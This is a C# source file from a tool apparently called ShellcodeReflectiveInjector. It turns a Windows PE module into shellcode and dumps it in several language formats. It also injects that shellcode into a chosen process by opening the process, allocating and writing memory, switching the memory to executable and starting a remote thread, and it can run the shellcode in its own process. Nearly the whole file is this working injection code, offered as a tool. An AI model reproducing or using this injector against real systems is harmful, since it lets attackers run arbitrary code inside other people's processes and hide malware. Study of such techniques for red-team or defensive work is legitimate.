using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using ShellcodeReflectiveInjector.Interop;

namespace ShellcodeReflectiveInjector.Library
{
    using NTSTATUS = Int32;
    using SIZE_T = UIntPtr;

    internal class Modules
    {
        public static bool GetShellcode(byte[] moduleBytes, string format)
        {
            byte[] shellcode;
            string output = Helpers.GetOutputFilePath(@"shellcode.bin");
            IMAGE_FILE_MACHINE machine = Helpers.GetPeArchitecture(moduleBytes);
            var status = false;

            do
            {
                if (!Helpers.IsValidPe(moduleBytes))
                {
                    Console.WriteLine("[-] Input data is not valid PE.");
                    break;
                }

                if (!(machine == IMAGE_FILE_MACHINE.AMD64) && !(machine == IMAGE_FILE_MACHINE.I386))
                {
                    Console.WriteLine("[-] Module architecture is not supported.");
                    break;
                }
                else
                {
                    Console.WriteLine("[*] Module architecture is {0}.", machine.ToString());
                }

                shellcode = Utilities.ConvertToShellcode(moduleBytes);

                if (shellcode.Length == 0)
                {
                    Console.WriteLine("[-] Module architecture is not supported.");
                    break;
                }
                else
                {
                    Console.WriteLine("[*] Got 0x{0} bytes shellcode.", shellcode.Length.ToString("X"));
                }

                if (Helpers.CompareIgnoreCase(format, "cs"))
                {
                    Console.WriteLine("[*] Dump shellcode in CSharp format:\n");
                    Console.WriteLine(Helpers.DumpDataAsCsharpFormat(shellcode));
                    Console.WriteLine();
                }
                else if (Helpers.CompareIgnoreCase(format, "c"))
                {
                    Console.WriteLine("[*] Dump shellcode in C Language format:\n");
                    Console.WriteLine(Helpers.DumpDataAsClanguageFormat(shellcode));
                    Console.WriteLine();
                }
                else if (Helpers.CompareIgnoreCase(format, "py"))
                {
                    Console.WriteLine("[*] Dump shellcode in Python format:\n");
                    Console.WriteLine(Helpers.DumpDataAsPythonFormat(shellcode));
                    Console.WriteLine();
                }
                else
                {
                    Console.WriteLine("[*] Export shellcode data to {0}.", output);
                    File.WriteAllBytes(output, shellcode);
                }

                status = true;
            } while (false);

            Console.WriteLine("[*] Done.");

            return status;
        }

        public static bool InjectShellcode(int pid, byte[] moduleBytes)
        {
            NTSTATUS ntstatus;
            int error;
            byte[] shellcode;
            IntPtr pShellcode;
            IntPtr pProtectBase;
            uint nNumberOfBytes;
            string processName;
            string addressFormat = Environment.Is64BitProcess ? "X16" : "X8";
            IMAGE_FILE_MACHINE machine = Helpers.GetPeArchitecture(moduleBytes);
            var hProcess = IntPtr.Zero;
            var status = false;

            try
            {
                processName = Process.GetProcessById(pid).ProcessName;
            }
            catch
            {
                Console.WriteLine("[!] The specified PID is not found.");

                return false;
            }

            do
            {
                if (!Helpers.IsValidPe(moduleBytes))
                {
                    Console.WriteLine("[-] Input data is not valid PE.");
                    break;
                }

                if (Environment.Is64BitProcess && (machine == IMAGE_FILE_MACHINE.I386))
                {
                    Console.WriteLine("[-] For 32bit module, should be built as 32bit binary.");
                    break;
                }
                else if (!Environment.Is64BitProcess && (machine == IMAGE_FILE_MACHINE.AMD64))
                {
                    Console.WriteLine("[-] For 64bit module, should be built as 64bit binary.");
                    break;
                }
                else if (!(machine == IMAGE_FILE_MACHINE.I386) && !(machine == IMAGE_FILE_MACHINE.AMD64))
                {
                    Console.WriteLine("[-] Module architecture is not supported.");
                    break;
                }
                else
                {
                    Console.WriteLine("[*] Module architecture is {0}.", machine.ToString());
                }

                Console.WriteLine("[>] Trying to convert module data to shellcode");

                shellcode = Utilities.ConvertToShellcode(moduleBytes);

                if (shellcode.Length == 0)
                {
                    Console.WriteLine("[-] Module architecture is not supported.");
                    break;
                }
                else
                {
                    Console.WriteLine("[*] Got 0x{0} bytes shellcode.", shellcode.Length.ToString("X"));
                }

                Console.WriteLine("[>] Trying to open the target process.");
                Console.WriteLine("    [*] Process ID   : {0}", pid);
                Console.WriteLine("    [*] Process Name : {0}", processName);

                hProcess = NativeMethods.OpenProcess(
                    ACCESS_MASK.PROCESS_CREATE_THREAD | ACCESS_MASK.PROCESS_QUERY_INFORMATION | ACCESS_MASK.PROCESS_VM_OPERATION | ACCESS_MASK.PROCESS_VM_WRITE,
                    false,
                    pid);

                if (hProcess == IntPtr.Zero)
                {
                    error = Marshal.GetLastWin32Error();
                    Console.WriteLine("[-] Failed to open the target process.");
                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(error, false));
                    break;
                }
                else
                {
                    Console.WriteLine("[+] Got a target process handle.");
                    Console.WriteLine("    [*] Process Handle : 0x{0}", hProcess.ToString("X"));

                    if (Environment.Is64BitOperatingSystem)
                    {
                        NativeMethods.IsWow64Process(hProcess, out bool isWow64);

                        if (!isWow64 && !Environment.Is64BitProcess)
                        {
                            Console.WriteLine("[-] To inject 64bit process, must be built as 64bit program");
                            break;
                        }
                        else if (isWow64 && Environment.Is64BitProcess)
                        {
                            Console.WriteLine("[-] To inject 32bit process, must be built as 32bit program");
                            break;
                        }
                    }
                }

                Console.WriteLine("[>] Trying to allocate shellcode buffer.");

                pShellcode = NativeMethods.VirtualAllocEx(
                    hProcess,
                    IntPtr.Zero,
                    new SIZE_T((uint)shellcode.Length),
                    ALLOCATION_TYPE.COMMIT | ALLOCATION_TYPE.RESERVE,
                    MEMORY_PROTECTION.READWRITE);

                if (pShellcode == IntPtr.Zero)
                {
                    error = Marshal.GetLastWin32Error();
                    Console.WriteLine("[-] Failed to allocate shellcode buffer.");
                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(error, false));
                    break;
                }
                else
                {
                    Console.WriteLine("[+] Shellcode buffer is at 0x{0}.", pShellcode.ToString(addressFormat));
                }

                Console.WriteLine("[>] Trying to write shellcode to the target process.", shellcode.Length);

                ntstatus = NativeMethods.NtWriteVirtualMemory(
                    hProcess,
                    pShellcode,
                    shellcode,
                    (uint)shellcode.Length,
                    out uint nWrittenBytes);

                if (ntstatus != Win32Consts.STATUS_SUCCESS)
                {
                    Console.WriteLine("[-] Failed to write shellcode to the target process.");
                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
                    break;
                }
                else
                {
                    Console.WriteLine("[+] {0} bytes shellcode is written in the target process.", nWrittenBytes);
                }

                pProtectBase = pShellcode;
                nNumberOfBytes = (uint)shellcode.Length;

                Console.WriteLine("[*] Shellcode is written in shellcode buffer.");

                Console.WriteLine("[>] Trying to update memory protection for shellcode buffer.");

                ntstatus = NativeMethods.NtProtectVirtualMemory(
                    hProcess,
                    ref pProtectBase,
                    ref nNumberOfBytes,
                    MEMORY_PROTECTION.EXECUTE_READ,
                    out MEMORY_PROTECTION _);
                status = (ntstatus == Win32Consts.STATUS_SUCCESS);

                if (!status)
                {
                    Console.WriteLine("[-] Failed to update memory protection for shellcode buffer.");
                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
                    break;
                }
                else
                {
                    Console.WriteLine("[+] Memory protection is updated successfully.");
                }

                Console.WriteLine("[>] Trying to create shellcode thread.");

                ntstatus = NativeMethods.NtCreateThreadEx(
                    out IntPtr hNewThread,
                    ACCESS_MASK.THREAD_ALL_ACCESS,
                    IntPtr.Zero,
                    hProcess,
                    pShellcode,
                    IntPtr.Zero,
                    false,
                    0,
                    0,
                    0,
                    IntPtr.Zero);
                status = (ntstatus == Win32Consts.STATUS_SUCCESS);

                if (!status)
                {
                    Console.WriteLine("[-] Failed to create thread.");
                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
                }
                else
                {
                    Console.WriteLine("[+] Shellcode thread is started successfully.");
                    Console.WriteLine("    [*] Thread Handle : 0x{0}", hNewThread.ToString("X"));
                    NativeMethods.NtClose(hNewThread);
                }
            } while (false);

            if (hProcess != IntPtr.Zero)
                NativeMethods.NtClose(hProcess);

            Console.WriteLine("[*] Done.");

            return status;
        }


        public static bool LoadShellcode(byte[] moduleBytes)
        {
            NTSTATUS ntstatus;
            int error;
            byte[] shellcode;
            IntPtr pShellcode;
            IntPtr pProtectBase;
            uint nNumberOfBytes;
            string addressFormat = Environment.Is64BitProcess ? "X16" : "X8";
            IMAGE_FILE_MACHINE machine = Helpers.GetPeArchitecture(moduleBytes);
            var status = false;

            do
            {
                if (!Helpers.IsValidPe(moduleBytes))
                {
                    Console.WriteLine("[-] Input data is not valid PE.");
                    break;
                }

                if (Environment.Is64BitProcess && (machine == IMAGE_FILE_MACHINE.I386))
                {
                    Console.WriteLine("[-] For 32bit module, should be built as 32bit binary.");
                    break;
                }
                else if (!Environment.Is64BitProcess && (machine == IMAGE_FILE_MACHINE.AMD64))
                {
                    Console.WriteLine("[-] For 64bit module, should be built as 64bit binary.");
                    break;
                }
                else if (!(machine == IMAGE_FILE_MACHINE.I386) && !(machine == IMAGE_FILE_MACHINE.AMD64))
                {
                    Console.WriteLine("[-] Module architecture is not supported.");
                    break;
                }
                else
                {
                    Console.WriteLine("[*] Module architecture is {0}.", machine.ToString());
                }

                Console.WriteLine("[>] Trying to convert module data to shellcode");

                shellcode = Utilities.ConvertToShellcode(moduleBytes);

                if (shellcode.Length == 0)
                {
                    Console.WriteLine("[-] Module architecture is not supported.");
                    break;
                }
                else
                {
                    Console.WriteLine("[*] Got 0x{0} bytes shellcode.", shellcode.Length.ToString("X"));
                }

                Console.WriteLine("[>] Trying to allocate shellcode buffer.");

                pShellcode = NativeMethods.VirtualAlloc(
                    IntPtr.Zero,
                    new SIZE_T((uint)shellcode.Length),
                    ALLOCATION_TYPE.COMMIT | ALLOCATION_TYPE.RESERVE,
                    MEMORY_PROTECTION.READWRITE);

                if (pShellcode == IntPtr.Zero)
                {
                    error = Marshal.GetLastWin32Error();
                    Console.WriteLine("[-] Failed to allocate shellcode buffer.");
                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(error, false));
                    break;
                }
                else
                {
                    Console.WriteLine("[+] Shellcode buffer is at 0x{0}.", pShellcode.ToString(addressFormat));
                }

                Marshal.Copy(shellcode, 0, pShellcode, shellcode.Length);

                pProtectBase = pShellcode;
                nNumberOfBytes = (uint)shellcode.Length;

                Console.WriteLine("[*] Shellcode is written in shellcode buffer.");

                Console.WriteLine("[>] Trying to update memory protection for shellcode buffer.");

                ntstatus = NativeMethods.NtProtectVirtualMemory(
                    Process.GetCurrentProcess().Handle,
                    ref pProtectBase,
                    ref nNumberOfBytes,
                    MEMORY_PROTECTION.EXECUTE_READ,
                    out MEMORY_PROTECTION _);
                status = (ntstatus == Win32Consts.STATUS_SUCCESS);

                if (!status)
                {
                    Console.WriteLine("[-] Failed to update memory protection for shellcode buffer.");
                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
                    break;
                }
                else
                {
                    Console.WriteLine("[+] Memory protection is updated successfully.");
                }

                Console.WriteLine("[>] Trying to create shellcode thread.");

                ntstatus = NativeMethods.NtCreateThreadEx(
                    out IntPtr hNewThread,
                    ACCESS_MASK.THREAD_ALL_ACCESS,
                    IntPtr.Zero,
                    Process.GetCurrentProcess().Handle,
                    pShellcode,
                    IntPtr.Zero,
                    false,
                    0,
                    0,
                    0,
                    IntPtr.Zero);
                status = (ntstatus == Win32Consts.STATUS_SUCCESS);

                if (!status)
                {
                    Console.WriteLine("[-] Failed to create thread.");
                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
                }
                else
                {
                    Console.WriteLine("[+] Shellcode thread is started successfully.");
                    Console.WriteLine("    [*] Thread Handle : 0x{0}", hNewThread.ToString("X"));
                    NativeMethods.NtWaitForSingleObject(hNewThread, BOOLEAN.TRUE, IntPtr.Zero);
                    NativeMethods.NtClose(hNewThread);
                }
            } while (false);

            Console.WriteLine("[*] Done.");

            return status;
        }
    }
}
